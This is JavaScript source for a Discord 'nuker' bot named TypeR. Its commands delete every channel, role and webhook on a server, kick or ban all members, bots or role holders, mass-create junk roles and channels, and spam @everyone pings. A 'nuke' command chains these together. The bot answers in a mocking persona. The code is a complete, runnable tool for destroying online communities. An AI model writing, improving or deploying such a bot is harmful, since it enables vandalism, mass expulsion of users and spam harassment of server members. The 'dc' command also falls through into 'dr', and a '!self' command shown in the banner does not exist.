import { Client, GatewayIntentBits, Events, PermissionsBitField, EmbedBuilder, ChannelType } from 'discord.js';
import { parse } from 'ini';
import { readFileSync } from 'fs';
import ora from 'ora';
import chalk from 'chalk';

const config = parse(readFileSync('./config.ini', 'utf-8'));
const TypeR = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.GuildWebhooks,
    ]
});

const PREFIX = config.settings.prefix;
const TOKEN = config.settings.token;

const OPERATORS = Array.isArray(config.settings.operators) 
    ? config.settings.operators 
    : config.settings.operators.includes(',')
    ? config.settings.operators.split(',').map(id => id.trim()) 
    : [config.settings.operators.trim()];

TypeR.on(Events.MessageCreate, async (message) => {
    if (!message.content.startsWith(PREFIX) || message.author.bot) return;

    if (!OPERATORS.some((id) => id === message.author.id)) {
        return message.reply('eww, u freak! ur not allowed to use this bot :3').catch(() => {});
    }

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    try {
        switch (command) {
            case 'dc': {
                await message.reply('ya, imma delete all channels real quick 😵‍💫');
                const channels = message.guild.channels.cache;
                await Promise.all(channels.map((channel) => channel.delete().catch(() => {})));

                const newChannel = await message.guild.channels.create({
                    name: message.author.username,
                    type: ChannelType.GuildText,
                });

                if (newChannel) {
                    await newChannel.send('bleh! i deleted em all :p');
                }
            //  return message.reply('done, u happy now? 🙄');
            }

            case 'dr': {
                await message.reply('roles? ew, deleting them rn 🙃');
                const roles = message.guild.roles.cache.filter((role) => role.id !== message.guild.id);
                await Promise.all(roles.map((role) => role.delete().catch(() => {})));
                return message.reply('all roles r gone, feel better now? 🤨');
            }

            case 'cr': {
                const amount = parseInt(args[0]) || 0;
                if (amount <= 0 || amount > 100) {
                    return message.reply('uhh no, gimme a valid number between 1-100 🙄');
                }

                await message.reply(`yah, i'm creating ${amount} roles for u rn :p`);
                await Promise.all(
                    Array.from({ length: amount }, async () => {
                        const name = `role-${Math.random().toString(36).substring(2, 15)}`;
                        const color = Math.floor(Math.random() * 16777215);
                        await message.guild.roles.create({ name, color }).catch(() => {});
                    })
                );

                return message.reply(`all ${amount} roles r done, happy now? 😵‍💫`);
            }

            case 'ka': {
                await message.reply('omg, kicking all users rn 😭');
                const members = message.guild.members.cache.filter((member) => !member.user.bot);
                await Promise.all(members.map((member) => member.kick().catch(() => {})));
                return message.reply('they r gone, like poof 😵‍💫');
            }

            case 'ba': {
                await message.reply('banning all users rn, hope u know what ur doing :3');
                const members = message.guild.members.cache.filter((member) => !member.user.bot);
                await Promise.all(members.map((member) => member.ban().catch(() => {})));
                return message.reply('yep, everyone is banned, savage 😭');
            }

            case 'mp': {
                const amount = parseInt(args[0]) || 0;
                if (amount <= 0) {
                    return message.reply('umm no, gimme a valid number of pings 🙃');
                }

                await message.reply(`pinging @everyone ${amount} times, u r so annoying 😵‍💫`);
                const channels = message.guild.channels.cache.filter((channel) => channel.isTextBased());

                await Promise.all(
                    channels.map((channel) =>
                        Promise.all(
                            Array.from({ length: amount }, () =>
                                channel.send('@everyone').catch(() => {})
                            )
                        )
                    )
                );

                return message.reply('done, i pinged em, now they hate u too 😭');
            }

            case 'dw': {
                await message.reply('webhooks? bye bye 🤨');
                const webhooks = await message.guild.fetchWebhooks();
                await Promise.all(webhooks.map((webhook) => webhook.delete().catch(() => {})));
                return message.reply('all webhooks r gone, like magic :p');
            }

            case 'kb': {
                await message.reply('kicking all bots rn, poor lil guys 😭');
                const bots = message.guild.members.cache.filter((member) => member.user.bot);
                await Promise.all(bots.map((bot) => bot.kick().catch(() => {})));
                return message.reply('bots kicked, they gonzo now 😵‍💫');
            }

            case 'bb': {
                await message.reply('banning all bots rn, rip to them :3');
                const bots = message.guild.members.cache.filter((member) => member.user.bot);
                await Promise.all(bots.map((bot) => bot.ban().catch(() => {})));
                return message.reply('bots r banned, what a savage move 😭');
            }

            case 'k': {
                const roleName = args.join(' ');
                const role = message.guild.roles.cache.find(
                    (r) => r.name === roleName || r.id === roleName
                );

                if (!role) {
                    return message.reply('eww, role not found 🙄');
                }

                await message.reply(`kicking all users with the role ${roleName}, brb :3`);
                const membersWithRole = message.guild.members.cache.filter((member) =>
                    member.roles.cache.has(role.id)
                );
                await Promise.all(membersWithRole.map((member) => member.kick().catch(() => {})));
                return message.reply(`they gone, no more ${roleName} ppl 😵‍💫`);
            }

            case 'b': {
                const roleName = args.join(' ');
                const role = message.guild.roles.cache.find(
                    (r) => r.name === roleName || r.id === roleName
                );

                if (!role) {
                    return message.reply('role? wat? not found 🙃');
                }

                await message.reply(`banning everyone with ${roleName}, this gon hurt 😭`);
                const membersWithRole = message.guild.members.cache.filter((member) =>
                    member.roles.cache.has(role.id)
                );
                await Promise.all(membersWithRole.map((member) => member.ban().catch(() => {})));
                return message.reply(`they all banned, u r heartless 😵‍💫`);
            }

            case 'mc': {
                const amount = parseInt(args[0]) || 0;
                const isVoice = args.includes('-v');

                if (amount <= 0 || amount > 100) {
                    return message.reply('nooo, pick a number between 1-100 🙄');
                }

                await message.reply(`making ${amount} ${isVoice ? 'voice' : 'text'} channels rn 🙃`);
                await Promise.all(
                    Array.from({ length: amount }, async () => {
                        const name = `Channel-${Math.random().toString(36).substring(2, 15)}`;
                        await message.guild.channels
                            .create({
                                name,
                                type: isVoice ? ChannelType.GuildVoice : ChannelType.GuildText,
                            })
                            .catch(() => {});
                    })
                );

                return message.reply(`done, made ${amount} channels, so cool right? 😵‍💫`);
            }

            case 'nuke': {
                const [channelsAmount, mentionsAmount] = args.map((arg) => parseInt(arg) || 0);
            
                await message.channel.send('bro u nuking the server? say less 🙄').catch(() => {});

                const roles = message.guild.roles.cache.filter((role) => role.id !== message.guild.id);
                const channels = message.guild.channels.cache;
            
                await Promise.all([
                    ...roles.map((role) => role.delete().catch(() => {})),
                    ...channels.map((channel) => channel.delete().catch(() => {})),
                ]);
            
                const fChn = await message.guild.channels.create({
                    name: 'post-apocalypse',
                    type: ChannelType.GuildText,
                }).catch(() => null);
            
                if (fChn) {
                    await fChn.send('the server is a wasteland now... but we rebuild here 🙃').catch(() => {});
                }
            
                const createdChannels = await Promise.all(
                    Array.from({ length: channelsAmount }, async () => {
                        const name = `Channel-${Math.random().toString(36).substring(2, 15)}`;
                        return message.guild.channels.create({
                            name,
                            type: ChannelType.GuildText,
                        }).catch(() => null);
                    })
                );

                const allChannels = [fChn, ...createdChannels.filter(Boolean)];
                await Promise.all(
                    allChannels.map((channel) =>
                        Promise.all(
                            Array.from({ length: mentionsAmount }, () =>
                                channel.send('@everyone').catch(() => {})
                            )
                        )
                    )
                );

                if (fChn) {
                    await fChn
                        .send(
                            `lalalala`
                        )
                        .catch(() => {});
                }
                break;
            }            

            case 'commands':
                case 'help': {
                    const embed = new EmbedBuilder()
                        .setTitle('TypeR Commands')
                        .setColor('#2f3136') // invisible color
                        .setDescription(`use the prefix \`${PREFIX}\` and one of these commands 😵‍💫`)
                        .addFields(
                            { name: `${PREFIX}dc`, value: 'delete all channels and recreate one named after u 🙄' },
                            { name: `${PREFIX}dr`, value: 'delete all roles, poof, gone 😵‍💫' },
                            { name: `${PREFIX}cr <amount>`, value: 'create a bunch of random roles (1-100) :p' },
                            { name: `${PREFIX}ka`, value: 'kick all users who aren’t bots, rip to them 🙃' },
                            { name: `${PREFIX}ba`, value: 'ban all users (not bots), kinda savage bro 😭' },
                            { name: `${PREFIX}mp <amount>`, value: 'ping @everyone <amount> times, u r annoying 😵‍💫' },
                            { name: `${PREFIX}dw`, value: 'delete all webhooks, bleh! 🙄' },
                            { name: `${PREFIX}kb`, value: 'kick all bots, poor lil guys 😭' },
                            { name: `${PREFIX}bb`, value: 'ban all bots, rip them forever 😵‍💫' },
                            { name: `${PREFIX}k <role name>`, value: 'kick everyone with the specified role 🙃' },
                            { name: `${PREFIX}b <role name>`, value: 'ban everyone with the specified role 😭' },
                            { name: `${PREFIX}mc <amount> [-v]`, value: 'mass create <amount> channels, add -v 4 voice channels 😵‍💫' },
                            { name: `${PREFIX}nuke <channels> <mentions>`, value: 'delete everything n recreate <channels>, ping <mentions> times 😭' }
                        )
                        .setFooter({ text: 'TypeR' });
                
                    return message.reply({ embeds: [embed] });
                }

            default:
                return message.reply('wat, i don’t even know what that means 🙃');
        }
    } catch (error) {
        console.error('Error:', error);
        return message.reply('omg, something broke, not my fault tho 😭');
    }
});

import gradient from 'gradient-string';

const _taag = `
${gradient(['#ff79c6', '#bd93f9'])('         ::::::::::: :::   ::: :::::::::  :::::::::: ::::::::: ')}
${gradient(['#ff79c6', '#bd93f9'])('            :+:     :+:   :+: :+:    :+: :+:        :+:    :+: ')}
${gradient(['#ff79c6', '#bd93f9'])('           +:+      +:+ +:+  +:+    +:+ +:+        +:+    +:+  ')}
${gradient(['#ff79c6', '#bd93f9'])('          +#+       +#++:   +#++:++#+  +#++:++#   +#++:++#:    ')}
${gradient(['#ff79c6', '#bd93f9'])('         +#+        +#+    +#+        +#+        +#+    +#+    ')}
${gradient(['#ff79c6', '#bd93f9'])('        #+#        #+#    #+#        #+#        #+#    #+#     ')}
${gradient(['#ff79c6', '#bd93f9'])('       ###        ###    ###        ########## ###    ###      ')}
`;

const _ct = gradient(['#ff79c6', '#bd93f9'])(`
╭────────────────────────────────────────────────────────────────────╮
│ !dc                  │ !dr                  │ !cr                  │
│ !ka                  │ !ba                  │ !mp                  │
│ !dw                  │ !kb                  │ !bb                  │
│ !k                   │ !b                   │ !mc                  │
│ !nuke                │ !self                │                      │
╰────────────────────────────────────────────────────────────────────╯
`);

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled rejection @:', promise, 'reason:', reason);
});

process.on('uncaughtException', (err) => {
    console.error('Uncaught exception:', err);
});

TypeR.once(Events.ClientReady, () => {
    console.log(_taag);
    console.log(_ct);
    ora(chalk.green('Burning rubber!')).succeed();
});

TypeR.login(TOKEN);